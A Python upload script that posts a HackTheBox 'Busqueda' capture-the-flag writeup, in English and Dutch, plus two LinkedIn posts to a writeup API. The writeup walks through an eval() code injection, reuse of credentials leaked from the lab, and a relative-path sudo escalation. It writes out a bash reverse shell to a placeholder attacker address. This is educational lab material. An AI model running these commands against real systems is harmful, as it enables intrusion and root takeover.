#!/usr/bin/env python3
import os, sys, requests

API_BASE = os.environ.get("CTF_API_URL", "http://localhost:8000")
API_KEY  = os.environ["CTF_API_KEY"]

writeup_en = """# HackTheBox — Busqueda (Easy) Writeup

## Recon

An initial Nmap scan of the target revealed two open ports:

```
nmap -sC -sV -p- -oN busqueda_full.nmap <target_ip>
```

| Port | State | Service |
|------|-------|---------|
| 22   | open  | OpenSSH 8.9p1 Ubuntu |
| 80   | open  | Apache 2.4.52 HTTP |

The server responded as `searcher.htb` and redirected to `http://searcher.htb/`. The website footer revealed the application was running on **Flask** and **Searchor 2.4.0**. A quick search confirmed that Searchor 2.4.0 is vulnerable to Python code injection via `eval()` in the `engine` parameter.

## Exploitation

### Python Code Injection via Searchor 2.4.0

Searchor 2.4.0 processes search queries using `eval()` without proper input sanitization. By injecting a malicious value into the `engine` parameter, arbitrary Python commands can be executed on the server.

A reverse shell payload was crafted and sent via Burp Suite — the `engine` parameter contained a Python reverse shell using `socket` and `subprocess`. The server responded with HTTP 200, and the browser was redirected to AccuWeather, confirming that `eval()` executed the payload.

```bash
# Netcat listener
nc -lvnp 13337
```

**Result:** A reverse shell as user **`svc`** inside `/var/www/app`.

## Privilege Escalation

### Step 1 — Credentials in .git/config

Inside `/var/www/app/.git/config`, the Gitea remote URL contained plaintext credentials:

```
http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

Gitea was running internally on `gitea.searcher.htb:3000` (version 1.18.0+rc1). The `cody` password also worked for the `administrator` account, granting access to private repositories.

### Step 2 — Sudo Misconfiguration

```bash
svc@busqueda:~$ sudo -l
User svc may run the following commands on busqueda:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/system-checkup.py *
```

### Step 3 — Docker Inspect Credential Leak

The `system-checkup.py` script accepted three subcommands: `docker-ps`, `docker-inspect`, and `full-checkup`. Running `docker-ps` showed two containers: `gitea` (port 3000) and `mysql_db` (port 3306).

Using `docker-inspect` with a Go template leaked the Gitea container environment variables:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
```

This revealed `GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh`, which gave access to the Gitea `administrator` account and the private repository containing the `system-checkup.py` source code.

### Step 4 — Relative Path Exploitation

Reading the source code revealed that `full-checkup` executed `./full-checkup.sh` using a **relative path** from the current working directory — no absolute path was specified.

```bash
cd /tmp
echo '#!/bin/bash' > full-checkup.sh
echo 'bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1' >> full-checkup.sh
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

**Result:** A root shell.

## Lessons Learned

1. **Never use `eval()` with user input:** Searchor 2.4.0 passed unsanitized input directly to `eval()`, enabling full remote code execution. Any user-controlled data must be strictly validated before evaluation.

2. **Credentials in version control:** Storing credentials in `.git/config` remote URLs is a critical mistake. These files are readable by anyone with filesystem access and persist in git history even after removal.

3. **Password reuse is dangerous:** The `cody` password also worked for the `administrator` account. Unique, strong passwords per service are essential.

4. **Relative paths in sudo scripts:** Using `./script.sh` instead of an absolute path in a script run with `sudo` allows any user with write access to the CWD to hijack execution. Always use absolute paths in privileged scripts.

5. **Docker inspect as an information leak:** Container environment variables often contain database passwords and API keys. Granting access to `docker-inspect` via sudo is equivalent to handing out those secrets.
"""

writeup_nl = """# HackTheBox — Busqueda (Easy) Writeup

## Verkenning

Een initiële Nmap-scan van het doelwit onthulde twee open poorten:

| Poort | Status | Dienst |
|-------|--------|--------|
| 22    | open   | OpenSSH 8.9p1 Ubuntu |
| 80    | open   | Apache 2.4.52 HTTP |

De server reageerde als `searcher.htb` en stuurde door naar `http://searcher.htb/`. De website-footer onthulde dat de applicatie draaide op **Flask** en **Searchor 2.4.0**. Searchor 2.4.0 is kwetsbaar voor Python code-injectie via `eval()` in de `engine`-parameter.

## Uitbuiting

### Python Code-injectie via Searchor 2.4.0

Searchor 2.4.0 verwerkt zoekopdrachten met `eval()` zonder invoervalidatie. Door een kwaadaardige waarde in de `engine`-parameter te injecteren, kunnen willekeurige Python-commando's worden uitgevoerd.

Een reverse shell payload werd verstuurd via Burp Suite. De server reageerde met HTTP 200 en de browser werd doorgestuurd naar AccuWeather — bewijs dat `eval()` de payload uitvoerde.

**Resultaat:** Een reverse shell als gebruiker **`svc`** in `/var/www/app`.

## Privilege Escalation

### Stap 1 — Credentials in .git/config

In `/var/www/app/.git/config` stond de Gitea remote URL met plaintext credentials:
`http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb`

Het wachtwoord van `cody` werkte ook voor het `administrator`-account in Gitea.

### Stap 2 — Sudo misconfiguratie

Gebruiker `svc` mocht `/usr/bin/python3 /opt/scripts/system-checkup.py *` uitvoeren als root zonder wachtwoord.

### Stap 3 — Docker Inspect lekt credentials

`docker-inspect '{{json .}}' gitea | jq` toonde de omgevingsvariabelen van de Gitea-container, inclusief `GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh`. Met dit wachtwoord werd toegang verkregen tot de private repository met de broncode van `system-checkup.py`.

### Stap 4 — Relatief pad exploitatie

De broncode toonde dat `full-checkup` het script `./full-checkup.sh` uitvoerde via een **relatief pad**. Door een kwaadaardig script met dezelfde naam in `/tmp` te plaatsen en het commando vanuit die map uit te voeren, werd een root-shell verkregen.

## Geleerde lessen

1. Gebruik nooit `eval()` met gebruikersinvoer — dit leidt direct tot RCE.
2. Sla geen credentials op in `.git/config` of andere versiebeheerbestanden.
3. Gebruik geen relatieve paden in scripts die met sudo worden uitgevoerd.
4. Docker inspect via sudo geeft toegang tot alle containergeheimen.
"""

linkedin_en = """Imagine finding a back door hidden inside a search bar. That is exactly what happened on HackTheBox's Busqueda machine.

The web application used an open-source library called Searchor 2.4.0, which processed search queries using Python's eval() function — passing user input directly to a code evaluator without any sanitization. By injecting a reverse shell payload into the search engine parameter, I gained immediate remote code execution on the server.

From there, credentials were hiding in plain sight inside a .git/config file — a Git remote URL containing a username and password in cleartext. That password opened the door to an internal Gitea instance, and password reuse gave access to the admin account.

The final step was a classic relative path trick: a sudo-privileged script called ./full-checkup.sh without an absolute path. By placing a malicious script with the same name in the current directory and running the sudo command from there, I had a root shell.

Key takeaway: every layer here was a known, preventable mistake — unvalidated eval(), hardcoded credentials in version control, password reuse, and unsafe sudo scripting. The chain from user to root required no exotic exploits, just careful enumeration.

🌐 https://cyberstefan.nl

#HackTheBox #CTF #CyberSecurity #EthicalHacking #Pentesting #Infosec #RCE"""

linkedin_nl = """Stel je voor: je vindt een achterdeur verborgen in een zoekbalk.

Dat is precies wat er speelde in de Busqueda-machine op HackTheBox. De webapplicatie gebruikte een bibliotheek die zoekopdrachten verwerkte met eval() — gebruikersinvoer rechtstreeks doorgegeven aan een code-evaluator, zonder enige validatie. Één injectie in het zoekveld was genoeg voor volledige toegang tot de server.

Vanaf daar lag het wachtwoord letterlijk in een configuratiebestand opgeslagen — plaintext, in een .git/config. Hetzelfde wachtwoord gaf toegang tot een intern platform én het beheerdersaccount. Wachtwoordhergebruik als dominosteentje.

De laatste stap was een klassieke scripting-fout: een beheerscript werd als root uitgevoerd, maar gebruikte een relatief pad voor een hulpscript. Door een kwaadaardig script met dezelfde naam neer te zetten en het commando vanuit die map uit te voeren, was de root-shell een feit.

Volledig writeup, slides en podcast op 🌐 https://cyberstefan.nl

#HackTheBox #CTF #Cybersecurity #EthicalHacking #Pentesting"""

payload = {
    "machine": "Busqueda",
    "difficulty": "Easy",
    "platform": "HackTheBox",
    "tags": ["RCE", "Web", "Enumeration", "Privesc", "Linux"],
    "writeup": writeup_en,
    "writeup_nl": writeup_nl,
    "linkedin": linkedin_en,
    "linkedin_nl": linkedin_nl,
}

r = requests.post(
    f"{API_BASE}/api/writeups",
    json=payload,
    headers={"X-API-Key": API_KEY, "Content-Type": "application/json"},
)
print(f"Status: {r.status_code}")
print(r.json())
